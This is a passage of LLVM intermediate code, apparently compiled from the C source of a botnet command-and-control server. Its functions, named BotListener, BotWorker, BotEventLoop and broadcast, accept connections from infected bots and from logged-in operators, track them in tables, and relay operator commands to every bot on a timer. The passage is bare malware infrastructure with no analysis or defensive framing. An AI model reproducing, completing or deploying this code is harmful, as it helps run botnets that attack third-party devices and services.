  %688 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %689 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %681, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.46, i64 0, i64 0), i8* %682, i8* %687, i8* %688)
  %690 = load %struct._IO_FILE*, %struct._IO_FILE** %46, align 8
  %691 = call i32 @fclose(%struct._IO_FILE* %690)
  %692 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %693 = load i32, i32* %4, align 4
  %694 = load i32, i32* %5, align 4
  %695 = sext i32 %694 to i64
  %696 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %695
  %697 = getelementptr inbounds %struct.login_info, %struct.login_info* %696, i32 0, i32 0
  %698 = getelementptr inbounds [100 x i8], [100 x i8]* %697, i64 0, i64 0
  call void @broadcast(i8* %692, i32 %693, i8* %698)
  %699 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %699, i8 0, i64 2048, i1 false)
  br label %434, !llvm.loop !19

700:                                              ; preds = %434
  br label %701

701:                                              ; preds = %700, %661, %643, %627, %619, %611, %603, %595, %587, %579, %571, %563, %555, %547, %519, %502, %494, %486, %478, %470, %425, %409, %401, %393, %385, %377, %369, %361, %353, %345, %337, %307, %306, %299, %290, %282, %273, %265, %256, %248, %239, %231, %222, %214, %159, %153, %138, %110, %104
  %702 = load i32, i32* %4, align 4
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %703
  %705 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %704, i32 0, i32 0
  store i32 0, i32* %705, align 4
  %706 = load i32, i32* %4, align 4
  %707 = call i32 @close(i32 %706)
  %708 = load volatile i32, i32* @OperatorsConnected, align 4
  %709 = add nsw i32 %708, -1
  store volatile i32 %709, i32* @OperatorsConnected, align 4
  %710 = load i8*, i8** %2, align 8
  ret i8* %710
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: nounwind readonly willreturn
declare i32 @strncmp(i8*, i8*, i64) #2

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64*) #3

; Function Attrs: nounwind
declare i64 @strftime(i8*, i64, i8*, %struct.tm*) #3

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %9 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %9, i32* %3, align 4
  %10 = load i32, i32* %3, align 4
  %11 = icmp slt i32 %10, 0
  br i1 %11, label %12, label %13

12:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.47, i64 0, i64 0))
  br label %13

13:                                               ; preds = %12, %1
  %14 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %14, i8 0, i64 16, i1 false)
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %15, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  store i32 0, i32* %17, align 4
  %18 = load i32, i32* %2, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #10
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %22 = load i32, i32* %3, align 4
  %23 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %24 = call i32 @bind(i32 %22, %struct.sockaddr* %23, i32 16) #9
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %27

26:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.48, i64 0, i64 0))
  br label %27

27:                                               ; preds = %26, %13
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @listen(i32 %28, i32 5) #9
  store i32 16, i32* %5, align 4
  br label %30

30:                                               ; preds = %27, %37
  %31 = load i32, i32* %3, align 4
  %32 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %33 = call i32 @accept(i32 %31, %struct.sockaddr* %32, i32* %5)
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp slt i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.49, i64 0, i64 0))
  br label %37

37:                                               ; preds = %36, %30
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = inttoptr i64 %39 to i8*
  %41 = call i32 @pthread_create(i64* %8, %union.pthread_attr_t* null, i8* (i8*)* @BotWorker, i8* %40) #9
  br label %30
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 4
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.50, i64 0, i64 0), i8* %21)
  call void @exit(i32 1) #11
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26) #8
  store i32 %27, i32* %10, align 4
  %28 = load i8**, i8*** %6, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 2
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* %30) #8
  store i32 %31, i32* %9, align 4
  %32 = load i8**, i8*** %6, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 1
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @create_and_bind(i8* %34)
  store volatile i32 %35, i32* @listenFD, align 4
  %36 = load volatile i32, i32* @listenFD, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %39

38:                                               ; preds = %23
  call void @abort() #11
  unreachable

39:                                               ; preds = %23
  %40 = load volatile i32, i32* @listenFD, align 4
  %41 = call i32 @make_socket_non_blocking(i32 %40)
  store i32 %41, i32* %8, align 4
  %42 = load i32, i32* %8, align 4
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %44, label %45

44:                                               ; preds = %39
  call void @abort() #11
  unreachable

45:                                               ; preds = %39
  %46 = load volatile i32, i32* @listenFD, align 4
  %47 = call i32 @listen(i32 %46, i32 4096) #9
  store i32 %47, i32* %8, align 4
  %48 = load i32, i32* %8, align 4
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %50, label %51

50:                                               ; preds = %45
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.51, i64 0, i64 0))
  call void @abort() #11
  unreachable

51:                                               ; preds = %45
  %52 = call i32 @epoll_create1(i32 0) #9
  store volatile i32 %52, i32* @epollFD, align 4
  %53 = load volatile i32, i32* @epollFD, align 4
  %54 = icmp eq i32 %53, -1
  br i1 %54, label %55, label %56

55:                                               ; preds = %51
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.52, i64 0, i64 0))
  call void @abort() #11
  unreachable

56:                                               ; preds = %51
  %57 = load volatile i32, i32* @listenFD, align 4
  %58 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %59 = bitcast %union.epoll_data* %58 to i32*
  store i32 %57, i32* %59, align 1
  %60 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %60, align 1
  %61 = load volatile i32, i32* @epollFD, align 4
  %62 = load volatile i32, i32* @listenFD, align 4
  %63 = call i32 @epoll_ctl(i32 %61, i32 1, i32 %62, %struct.epoll_event* %11) #9
  store i32 %63, i32* %8, align 4
  %64 = load i32, i32* %8, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %67

66:                                               ; preds = %56
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0))
  call void @abort() #11
  unreachable

67:                                               ; preds = %56
  %68 = load i32, i32* %9, align 4
  %69 = add nsw i32 %68, 2
  %70 = zext i32 %69 to i64
  %71 = call i8* @llvm.stacksave()
  store i8* %71, i8** %12, align 8
  %72 = alloca i64, i64 %70, align 16
  store i64 %70, i64* %13, align 8
  br label %73

73:                                               ; preds = %77, %67
  %74 = load i32, i32* %9, align 4
  %75 = add nsw i32 %74, -1
  store i32 %75, i32* %9, align 4
  %76 = icmp ne i32 %74, 0
  br i1 %76, label %77, label %83

77:                                               ; preds = %73
  %78 = load i32, i32* %9, align 4
  %79 = add nsw i32 %78, 1
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i64, i64* %72, i64 %80
  %82 = call i32 @pthread_create(i64* %81, %union.pthread_attr_t* null, i8* (i8*)* @BotEventLoop, i8* null) #9
  br label %73, !llvm.loop !20

83:                                               ; preds = %73
  %84 = getelementptr inbounds i64, i64* %72, i64 0
  %85 = load i32, i32* %10, align 4
  %86 = sext i32 %85 to i64
  %87 = inttoptr i64 %86 to i8*
  %88 = call i32 @pthread_create(i64* %84, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %87) #9
  br label %89

89:                                               ; preds = %90, %83
  br label %90

90:                                               ; preds = %89
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i64 0, i64 0))
  %91 = call i32 @sleep(i32 60)
  br label %89
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #9
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.55, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #9
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #9
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.56, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #9
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !21

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.57, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #9
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
